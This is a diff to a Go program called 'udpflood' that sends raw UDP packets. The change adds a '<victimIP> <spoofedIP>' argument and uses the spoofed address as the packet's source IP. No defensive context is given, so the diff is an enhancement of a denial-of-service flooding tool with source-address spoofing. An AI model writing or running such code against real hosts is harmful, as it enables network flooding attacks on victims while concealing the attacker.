@@ -20,8 +20,8 @@ func main() {
 	}
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	check(err)
-	if len(os.Args) < 2 {
-		log.Fatal("usage: udpflood <ip>")
+	if len(os.Args) < 3 {
+		log.Fatal("usage: udpflood <victimIP> <spoofedIP>")
 	}
 	raddr := net.ParseIP(os.Args[1])
 	addr := syscall.SockaddrInet4{
@@ -46,12 +46,12 @@ func main() {
 
 func packet(raddr net.IP) []byte {
 	ip := &layers.IPv4{
-		Version:  0x4,
-		TOS:      0x4,
-		TTL:      0x40,
-		Protocol: layers.IPProtocolUDP,
-		SrcIP:    net.ParseIP("0.0.0.1"),
-		DstIP:    raddr,
+		Version:           0x4,
+		TOS:               0x0,
+		TTL:               0x40,
+		Protocol:          layers.IPProtocolUDP,
+		SrcIP:             net.ParseIP(os.Args[2]),
+		DstIP:             raddr,
 		WithRawINETSocket: true,
 	}
 	udp := &layers.UDP{
